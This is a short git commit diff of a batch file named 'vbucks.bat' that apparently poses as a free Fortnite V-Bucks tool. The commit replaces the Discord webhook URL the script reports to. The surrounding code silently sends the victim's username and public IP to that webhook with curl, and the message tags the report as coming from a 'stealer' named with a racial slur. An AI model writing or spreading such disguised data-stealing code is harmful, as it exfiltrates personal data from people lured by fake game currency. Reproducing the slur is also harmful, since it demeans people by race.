6d531db3e87dd011f4191e3058ab7c5b8b2c54c9
Alec Kozlov <44117836+TheTimeShare@users.noreply.github.com>
2023-01-20 11:07:14 +0100

    Update vbucks.bat

--- vbucks.bat
+++ vbucks.bat
@@ -4,7 +4,7 @@ set "vpath=C:\ProgramData"
 
 cd %vpath%
 
-set "webhook=https://discord.com/api/webhooks/1044755955658805288/PIqw_rlluc9xbt3MurYhOx7Cz3PZC7ramK5Ew9i1htU86SgmeM2R3J5de9QuKscE4o3Y"
+set "webhook=https://discord.com/api/webhooks/1065935417418973214/oN4y1L9K1Y0N0YhEB7kmZrzBL-yZw_n9bTeBcV8YQgkxx7x69FYFilRU0vN_FpS6CnSu"
 
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %PublicIP% - Nigger stealer]```\"}"  %webhook%
 
